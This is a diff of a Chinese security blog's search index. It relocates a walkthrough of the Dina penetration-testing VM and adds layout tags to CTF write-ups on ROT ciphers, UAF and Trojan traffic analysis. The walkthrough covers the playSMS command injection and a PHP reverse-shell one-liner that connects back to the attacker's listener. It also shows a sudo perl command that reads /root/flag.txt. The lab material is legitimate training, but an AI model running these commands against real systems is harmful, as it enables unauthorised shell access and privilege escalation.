@@ -1,9 +1,59 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Dina渗透</title>
+    <url>/2018/12/08/Dina%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。</p>
+<span id="more"></span>
+
+<h2 id="发现目标主机"><a href="#发现目标主机" class="headerlink" title="发现目标主机"></a>发现目标主机</h2><p>利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令：</p>
+<p><code>nmap 192.168.43.0/24</code></p>
+<p>扫描目标端内所有的存活主机</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181128233231.png"></p>
+<p>发现目标主机：<code>192.168.43.130</code></p>
+<p>开放端口：<code>80</code></p>
+<p>访问目标服务器<img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181203152020.png"></p>
+<p>查看源代码什么的，发现没有什么入口什么的。可能需要寻找其他的入侵点。</p>
+<h2 id="发现登录入口"><a href="#发现登录入口" class="headerlink" title="发现登录入口"></a>发现登录入口</h2><p>没事就看看robots.txt，没准就有惊喜。查看robots.txt。真的有惊喜！！！</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/ange1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/angel1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/nothing</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/tmp</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/uploads</span><br></pre></td></tr></table></figure>
+
+<p>这几个几个页面依次访问一下，除了<code>\nothing</code>这个页面，其他的都一个个文件夹，一度让我以为是文件上传，卡了很久。。。。。。头疼。后来想了一下，会不会还有什么页面没有出现，用<code>dirb</code>–kali下的一个扫描的软件–默认字典就够了。</p>
+<p>发现页面：<code>http://192.168.43.130/secure/</code>，访问得到一个压缩包，打开需要密码，结合前面noting页面发现的几个密码，一个个尝试发现工作量也不是很大，或者使用zip2John爆破，可以发现密码为<code>freedom</code></p>
+<p>nothing页面发现的密码：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142134.png"></p>
+<p>打开压缩包，提取文件，是一个后缀为MP3的文件，但是。。。我并不想听音乐，所以，先用strings命令查看一下有没有特殊的东西，有线索。。</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142626.png"></p>
+<p>ok,发现新的页面，继续访问，是个登录页面，从压缩包中获取的文件得知，只有用户名，密码还是得一个个试。。。。测试过后得到：</p>
+<p><code>username：touhid</code></p>
+<p><code>password：diana</code></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录，发现是一个playSMS的网站，上网找一下有没有漏洞，早exploit-DB上面发现一个远程命令执行，发现可以使用，具体漏洞：<a href="https://www.exploit-db.com/exploits/42044%E3%80%82%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%82%B9%E5%9C%A8%E4%BA%8E%E7%94%B5%E8%AF%9D%E7%B0%BF%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%9C%A8%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E4%B8%AD%E5%BE%88%E6%B8%85%E6%A5%9A%E3%80%82%E7%9B%B4%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E3%80%82">https://www.exploit-db.com/exploits/42044。查看可知漏洞的点在于电话簿用户信息的导入，具体利用方式在漏洞说明中很清楚。直接可以使用。</a></p>
+<p>漏洞利用文件：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206143717.png"></p>
+<p>上传，利用burpsuite抓包，由于执行的命令在USER_AGENT，所以修改http请求的USER_AGENT的内容为我们要执行的命令就可以了。</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144238.png"></p>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144245.png"></p>
+<p>下一步就是反弹shell了，我的kali攻击机的IP地址为：192.168.43.129，所以把shell反弹到这就行了，监听kali 的8008端口：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144851.png"></p>
+<p>利用命令：</p>
+<p><code>php -r &#39;$sock=fsockopen(&quot;192.168.43.129&quot;,8008);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
+<p>getshell:</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145215.png"></p>
+<p>成功进入主机！！！</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="symbol">&#x27;exec</span> <span class="string">&quot;cat /root/flag.txt&quot;</span>;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145522.png"></p>
+<p>hack it！！</p>
+]]></content>
+      <tags>
+        <tag>-总结</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF学习指南</title>
     <url>/2018/12/08/CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PWN,Reverse：偏重对汇编，逆向的理解，逆向更多要求对于各种代码的了解，会常见开发，注重算法的理解，数据结构和算法一定要学好；PWN要求对于计算机系统的了解，对于基础的数据结构-栈堆-以及Linux/widows下的程序调用比较熟悉。</p>
+    <content><![CDATA[<span id="more"></span>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PWN,Reverse：偏重对汇编，逆向的理解，逆向更多要求对于各种代码的了解，会常见开发，注重算法的理解，数据结构和算法一定要学好；PWN要求对于计算机系统的了解，对于基础的数据结构-栈堆-以及Linux/widows下的程序调用比较熟悉。</p>
 <p>crypto：偏重对数学，算法的深入学习，同时也需要对常见密码有所了解-AES/DES等；</p>
 <p>Web：需要对各种web漏洞了解，明白其形成原因和利用方式；了解计算机网络、网站搭建、会用常见的网站框架，同时需要大量的练习；</p>
 <p>Misc：则更为复杂，所有与计算机安全挑战有关的都算在其中，所学很杂，积累和刷题很重要，常见有流量分析/隐写等；</p>
@@ -96,7 +146,8 @@
   <entry>
     <title>CTF学习记录</title>
     <url>/2020/03/12/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h2 id="0x01-Crypto"><a href="#0x01-Crypto" class="headerlink" title="0x01 Crypto"></a>0x01 Crypto</h2><h3 id="ROT"><a href="#ROT" class="headerlink" title="ROT"></a>ROT</h3><p>题目链接：<a href="https://buuoj.cn/files/3cc926e4d300e09c64cdfe79e9aafd6c/a6a57ad9-733a-46b3-b233-c932712e7c70.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwM30.XmpJtA.dIAyc6lC0FaBOvD-nuV2Fok_e9M">点击获取</a></p>
+    <content><![CDATA[<span id="more"></span>
+<h2 id="0x01-Crypto"><a href="#0x01-Crypto" class="headerlink" title="0x01 Crypto"></a>0x01 Crypto</h2><h3 id="ROT"><a href="#ROT" class="headerlink" title="ROT"></a>ROT</h3><p>题目链接：<a href="https://buuoj.cn/files/3cc926e4d300e09c64cdfe79e9aafd6c/a6a57ad9-733a-46b3-b233-c932712e7c70.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwM30.XmpJtA.dIAyc6lC0FaBOvD-nuV2Fok_e9M">点击获取</a></p>
 <h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，需要了解什么是ROT。ROT是一种简单的替换算法，这种算法的主要加密方法是将所有明文密码同时左移或者右移某一长度，常见的是ROT13。ROT可以在二十六个字母之间替换，也可以在所有可见字符替换，如果没有指明是什么替换的话，全部试一遍也许是个不错的选择，运算量也不大。恺撒加密可以是为ROT的一种。</p>
 <h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">83</span>, <span class="number">89</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">45</span>, <span class="number">86</span>, <span class="number">96</span>, <span class="number">45</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">136</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">108</span>, <span class="number">128</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">123</span>,</span><br><span class="line">          <span class="number">111</span>, <span class="number">110</span>, <span class="number">127</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">124</span>, <span class="number">122</span>, <span class="number">108</span>, <span class="number">118</span>, <span class="number">128</span>, <span class="number">108</span>, <span class="number">131</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">124</span>, <span class="number">124</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">76</span>,</span><br><span class="line">          <span class="number">76</span>, <span class="number">76</span>, <span class="number">76</span>, <span class="number">138</span>, <span class="number">23</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">65</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">69</span>, <span class="number">61</span>, <span class="number">70</span>, <span class="number">114</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">69</span>,</span><br><span class="line">          <span class="number">67</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">61</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">62</span>, <span class="number">70</span>, <span class="number">61</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">112</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;</span></span><br><span class="line">    <span class="comment"># print hashlib.md5(flag).hexdigest()</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                    <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(hashlib.md5(flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(</span><br><span class="line">                            d) + <span class="string">&quot;&#125;&quot;</span>).hexdigest()) == <span class="string">&quot;38e4c352809e150186920aac37190cbc&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i - j)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">    check()</span><br></pre></td></tr></table></figure>
 
@@ -132,7 +183,8 @@
   <entry>
     <title>[PWNABLE.kr]uaf</title>
     <url>/2020/06/14/PWNABLE-kr-uaf/</url>
-    <content><![CDATA[<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="UAF知识"><a href="#UAF知识" class="headerlink" title="UAF知识"></a>UAF知识</h2><ol>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="UAF知识"><a href="#UAF知识" class="headerlink" title="UAF知识"></a>UAF知识</h2><ol>
 <li><p>UAF：Use After Free是PWN中常见的堆利用方式，是指在程序中对于某个指针在free后，指针的值并没有置为NULL，仍然可以被调用。</p>
 </li>
 <li><p>使用方式</p>
@@ -156,58 +208,12 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Dina渗透</title>
-    <url>/2018/12/08/Dina%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<p>Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。</p>
-<h2 id="发现目标主机"><a href="#发现目标主机" class="headerlink" title="发现目标主机"></a>发现目标主机</h2><p>利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令：</p>
-<p><code>nmap 192.168.43.0/24</code></p>
-<p>扫描目标端内所有的存活主机</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181128233231.png"></p>
-<p>发现目标主机：<code>192.168.43.130</code></p>
-<p>开放端口：<code>80</code></p>
-<p>访问目标服务器<img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181203152020.png"></p>
-<p>查看源代码什么的，发现没有什么入口什么的。可能需要寻找其他的入侵点。</p>
-<h2 id="发现登录入口"><a href="#发现登录入口" class="headerlink" title="发现登录入口"></a>发现登录入口</h2><p>没事就看看robots.txt，没准就有惊喜。查看robots.txt。真的有惊喜！！！</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/ange1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/angel1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/nothing</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/tmp</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/uploads</span><br></pre></td></tr></table></figure>
-
-<p>这几个几个页面依次访问一下，除了<code>\nothing</code>这个页面，其他的都一个个文件夹，一度让我以为是文件上传，卡了很久。。。。。。头疼。后来想了一下，会不会还有什么页面没有出现，用<code>dirb</code>–kali下的一个扫描的软件–默认字典就够了。</p>
-<p>发现页面：<code>http://192.168.43.130/secure/</code>，访问得到一个压缩包，打开需要密码，结合前面noting页面发现的几个密码，一个个尝试发现工作量也不是很大，或者使用zip2John爆破，可以发现密码为<code>freedom</code></p>
-<p>nothing页面发现的密码：</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142134.png"></p>
-<p>打开压缩包，提取文件，是一个后缀为MP3的文件，但是。。。我并不想听音乐，所以，先用strings命令查看一下有没有特殊的东西，有线索。。</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142626.png"></p>
-<p>ok,发现新的页面，继续访问，是个登录页面，从压缩包中获取的文件得知，只有用户名，密码还是得一个个试。。。。测试过后得到：</p>
-<p><code>username：touhid</code></p>
-<p><code>password：diana</code></p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录，发现是一个playSMS的网站，上网找一下有没有漏洞，早exploit-DB上面发现一个远程命令执行，发现可以使用，具体漏洞：<a href="https://www.exploit-db.com/exploits/42044%E3%80%82%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%82%B9%E5%9C%A8%E4%BA%8E%E7%94%B5%E8%AF%9D%E7%B0%BF%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%9C%A8%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E4%B8%AD%E5%BE%88%E6%B8%85%E6%A5%9A%E3%80%82%E7%9B%B4%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E3%80%82">https://www.exploit-db.com/exploits/42044。查看可知漏洞的点在于电话簿用户信息的导入，具体利用方式在漏洞说明中很清楚。直接可以使用。</a></p>
-<p>漏洞利用文件：</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206143717.png"></p>
-<p>上传，利用burpsuite抓包，由于执行的命令在USER_AGENT，所以修改http请求的USER_AGENT的内容为我们要执行的命令就可以了。</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144238.png"></p>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144245.png"></p>
-<p>下一步就是反弹shell了，我的kali攻击机的IP地址为：192.168.43.129，所以把shell反弹到这就行了，监听kali 的8008端口：</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144851.png"></p>
-<p>利用命令：</p>
-<p><code>php -r &#39;$sock=fsockopen(&quot;192.168.43.129&quot;,8008);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
-<p>getshell:</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145215.png"></p>
-<p>成功进入主机！！！</p>
-<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="symbol">&#x27;exec</span> <span class="string">&quot;cat /root/flag.txt&quot;</span>;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145522.png"></p>
-<p>hack it！！</p>
-]]></content>
-      <tags>
-        <tag>-总结</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Trojan流量分析</title>
     <url>/2020/02/18/Trojan%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>﻿## 原理解析</p>
 <p><img src="https://img-blog.csdnimg.cn/20200218223743627.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="Trojan原理"><br>如图所示，Trojan工作在443端口，处理来自外界的HTTPS请求，如果是合法的Trojan请求，那么为该请求提供服务，否则就将该流量转发给web。服务器Nginx，由Nginx为其提供服务。基于这个工作工程可以知道，Trojan的一切表现均与Nginx一致，不会引入额外特征，从而达到无法识别的效果。当然，为了防止恶意探测，我们需要将80端口的流量全部重定向到443端口，并且服务器只暴露80和443端口，这样可以使得服务器与常见的Web服务器表现一致。</p>
 <p>当Trojan客户端连接到服务器时，它首先执行真正的TLS握手。如果握手成功，则所有后续流量都将受到TLS的保护；</p>
+<span id="more"></span>
 <h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><p><strong>本机IP</strong>: 192.168.31.176</p>
 <p><strong>服务器IP</strong>: 91.220.202.97<br><img src="https://img-blog.csdnimg.cn/20200218224249153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="TCP与TLS握手"><br>TCP握手包序号：73，74，75</p>
 <p>TLS握手：76，77，78，79，80，81，82，83</p>
@@ -235,6 +241,7 @@
     <title>省赛总结</title>
     <url>/2018/10/30/%E7%9C%81%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><p>2018年10月20日</p>
+<span id="more"></span>
 <p>这次比赛作为华师代表队Check参与比赛，深深感觉自己的知识水平真的不够，题目做的太少了，还是以后要加强学习，学的太少了。题目都是web题目，web好久没做了，有点手生。比赛和CTF不同，主要是渗透测试。</p>
 <ul>
 <li>初赛题目四个，分别是两个内网题目，两个外网题目，外网平台分别是一个网上的APP下载平台，和一个Apache服务器。</li>
@@ -265,6 +272,8 @@
     <title>第十二届全国大学生信息安全竞赛--Writeup</title>
     <url>/2019/04/23/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-Writeup/</url>
     <content><![CDATA[<p>Author: <a href="https://ch3cke.github.io/">ch3cke</a></p>
+<span id="more"></span>
+
 <h2 id="0x00-签到题"><a href="#0x00-签到题" class="headerlink" title="0x00 签到题"></a>0x00 签到题</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/%E7%AD%BE%E5%88%B0%E9%A2%98%E7%9B%AE.png" alt="签到"></p>
 <p>文件连接：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/qiandao_32ac2a19cef66c300e29fafac57b9e1a%20(1).zip">点击下载</a></p>
 <p>直接在本地运行，会调用摄像头识别人脸，如果有三个人出现就会在运行终端出现flag;(不过识别不是那么精确，感有时候一个人也可以)</p>
